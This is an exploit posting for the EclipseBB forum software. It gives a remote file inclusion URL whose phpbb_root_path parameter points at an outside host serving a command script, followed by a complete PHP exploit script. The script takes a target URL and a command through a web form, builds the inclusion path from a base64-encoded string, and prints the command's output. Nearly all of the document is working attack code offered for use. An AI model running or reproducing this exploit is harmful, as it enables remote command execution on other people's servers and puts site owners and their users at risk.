/* Script Informations
## MOD Title: EclipseBB
## MOD Author: KooLTaB101 < matt@phasedma.com > (Matt)
## MOD Website: http://www.eclipsebb.com
## MOD Description: A Pre-Modded phpBB Forum Solution
*/

Remote File include :-
includes/functions.php?phpbb_root_path=http://psevil.googlepages.com/cmd.txt?

Exploit :
<?php
/*******************************************/
/*   EclipseBB Command Execution Exploit   */
/*  By : HACKERS PAL <security@soqor.net>  */
/*        Website : WwW.SoQoR.NeT          */
/*******************************************/

error_reporting(0);
ini_set("max_execution_time",0);
Function
get_page($url){if(function_exists("file_get_contents")){$contents=file_get_contents($url);}else{$fp=fopen("$url","r");while($line=fread($fp,1024)){$contents=$contents
.$line;}}return$contents;}
Echo "<body bgcolor=\"#000000\" text=\"#00FF00\">\n<title>EclipseBB Command Execution Exploit by : HACKERS PAL :: WwW.SoQoR.NeT ::</title>\n\r"."<h2>EclipseBB Command
Execution\n\r"."<h3>By : HACKERS PAL [security@soqor.net]\n\r"."<h3>VisiT My Website [<a href=\"http://WwW.SoQoR.NeT\">WwW.SoQoR.NeT</a>]\n\r";
     $expl=base64_decode("aW5jbHVkZXMvZnVuY3Rpb25zLnBocD9waHBiYl9yb290X3BhdGg9aHR0cDovL3BzZXZpbC5nb29nbGVwYWdlcy5jb20vY21kLnR4dD8=");
     $action=$_GET['action'];
     if($action == "")
     {
      echo "<form action=\"$PHP_SELF?action=2\" method=\"post\">\n     Web URL  -- Example : http://localhost/eclipsebb\n     <br> <input type=\"text\" name=\"url\"
style=\"width:250\">\n     <br>     <br>\n     Command : <br> <textarea name=\"query\" cols=\"70\" rows=\"5\"></textarea>\n     <br>\n     <br>       <div
align=\"center\">\n     <input type=\"submit\">       </div>\n     </form>\n     ";
     }
     else
     {
     $exploit=$_POST['url']."/".$expl."&cmd=".$_POST['query'];
     $page=get_page($exploit);
     if(!eregi("hacking attempt",$page))
     {
      Echo "<h1> Command Successfully executed .. Result is</h1> $page <br> Thanks For Using This exploit .. Have Fun :)<br><br><br>";

     }

     }
die(base64_decode("PGRpdiBhbGlnbj0iY2VudGVyIj4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPgpHPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+cjwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+RUU8L2ZvbnQ
+PGZvbnQgY29sb3I9IndoaXRlIj50PC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5aPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+CjoKPC9mb250Pgo8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+CkQ8L2ZvbnQ+PGZvb
nQgY29sb3I9IndoaXRlIj5ldmk8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDgwMDAiPkw8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj4tPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4wMDwvZm9udD48Zm9udCBjb2x
vcj0id2hpdGUiPgosCjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPk08L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5vPC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIj5oQTwvZm9udD48Zm9udCBjb2xvcj0id
2hpdGUiPmphPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5saSA8L2ZvbnQ+Cjxmb250IGNvbG9yPSIjRkZGRkZGIj4sPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj4KRDwvZm9udD48Zm9udCBjb2xvcj0id2h
pdGUiPnIuPC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIj5FPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+eDwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+RTwvZm9udD48Zm9udCBjb2xvcj0id2hpdGU
 iPgosCjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPgpHPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+YUNrZTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+UjwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUi
PiAsCjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPlM8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5wPC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIj4xZDwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPmU8L2
ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlI8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5fPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5OPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+ZXQgLAo8L2ZvbnQ+
Cjxmb250IGNvbG9yPSIjRkYwMDAwIj5CPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+bGFjawo8L2ZvbnQ+Cjxmb250IGNvbG9yPSIjRkYwMDAwIj5BPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+dHRhQzwvZm9udD
48Zm9udCBjb2xvcj0iIzAwODAwMCI+azwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPiAsCjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPk08L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5pbmk8L2ZvbnQ+PGZv
bnQgY29sb3I9IiNGRjAwMDAiPk08L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5hPC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIj5uPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+ICwKPC9mb250Pgo8Zm9u
 dCBjb2xvcj0iI0ZGMDAwMCI+SjwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPmE8L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDgwMDAiPnJlPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+ZTwvZm9udD48Zm9udCBjb2xvc
j0iI0ZGMDAwMCI+SDwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPjxmb250IGNvbG9yPSIjRkYwMDAwIj4KQjwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPmE8L2ZvbnQ+PC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDA
wIj5naDwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPmRhPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIj5EPC9mb250Pjxmb250IGNvbG9yPSIjRkZGRkZGIj4KLCA8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiP
kQ8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZGRkYiPnIgPC9mb250Pgo8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+SDwvZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiI+YTwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+Y2s
8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZGRkYiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPnI8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZGRkYiPgosPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+PGJyPgo8L
2ZvbnQ+Cjxmb250IGNvbG9yPSIjRkYwMDAwIj5TPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+cDwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+ZWM8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5pYTwvZ
 m9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+bCBHPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+cjwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+RUU8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj50PC9mb250Pj
xmb250IGNvbG9yPSIjRkYwMDAwIj5aPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+CjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPkY8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5vciA6CjwvZm9udD4KPGZv
bnQgY29sb3I9IiNGRjAwMDAiPlM8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5vPC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIj5RPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+bzwvZm9udD48Zm9udCBjb2xvcj
0iI0ZGMDAwMCI+UjwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPi48L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPk48L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5lPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAw
Ij5UPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+CjwvZm9udD4KPGZvbnQgY29sb3I9IiNGRjAwMDAiPlQ8L2ZvbnQ+PGZvbnQgY29sb3I9IndoaXRlIj5lYTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+TTwvZm
9udD48Zm9udCBjb2xvcj0id2hpdGUiPgo8L2ZvbnQ+Cjxmb250IGNvbG9yPSIjRkYwMDAwIj5BPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+bjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+RDwvZm9udD
 48Zm9udCBjb2xvcj0id2hpdGUiPgo8L2ZvbnQ+Cjxmb250IGNvbG9yPSIjRkYwMDAwIj5NPC9mb250Pjxmb250IGNvbG9yPSJ3aGl0ZSI+ZTwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCI+bWI8L2ZvbnQ+PGZvbnQ
gY29sb3I9IndoaXRlIj5lcjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+UzwvZm9udD48Zm9udCBjb2xvcj0id2hpdGUiPjsKPC9mb250Pgo8L2I+Cjxicj48YnI+CjxhIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246I
G5vbmUiIGhyZWY9Im1haWx0bzpzZWN1cml0eUBzb3Fvci5uZXQiPgo8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+UzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiI+ZTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+Qzw
vZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiI+dTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+UjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiI+aTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCI+VDwvZm9ud
D48Zm9udCBjb2xvcj0iI0ZGRkZGRiI+eTwvZm9udD48Zm9udCBjb2xvcj0iIzAwODAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+W0FUXTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVmVyZGFuYSI
gc2l6ZT0iMiI+UzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+bzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+UTw
 vZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+bzwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+UjwvZm9udD48Zm9udCBjb2xv
cj0iIzAwODAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+W0RvVF08L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiIGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPk48L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZGRkYiIG
ZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPmU8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiIGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPlQ8L2ZvbnQ+PC9hPgo8YnI+CjxhIGhyZWY9Imh0dHA6Ly93d3cuc29xb3IubmV0
IiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lOyI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlc8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRkZGRkYiPnc8L2ZvbnQ+PGZvbnQgY29sb3I9IiNGRjAwMDAiPlc8L2ZvbnQ+PG
ZvbnQgY29sb3I9IiMwMDgwMDAiIGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPltEb1RdPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIiBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj5TPC9mb250Pjxmb250IGNvbG9yPSIj
RkZGRkZGIiBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj5vPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIiBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj5RPC9mb250Pjxmb250IGNvbG9yPSIjRkZGRkZGIiBmYWNl
 PSJWZXJkYW5hIiBzaXplPSIyIj5vPC9mb250Pjxmb250IGNvbG9yPSIjRkYwMDAwIiBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj5SPC9mb250Pjxmb250IGNvbG9yPSIjMDA4MDAwIiBmYWNlPSJWZXJkYW5hIiBzaXplP
SIyIj5bRG9UXTwvZm9udD48Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+TjwvZm9udD48Zm9udCBjb2xvcj0iI0ZGRkZGRiIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+ZTwvZm9udD4
8Zm9udCBjb2xvcj0iI0ZGMDAwMCIgZmFjZT0iVmVyZGFuYSIgc2l6ZT0iMiI+VDwvZm9udD48L2E+CjwvZGl2Pgo8L2JvZHk+"));
?>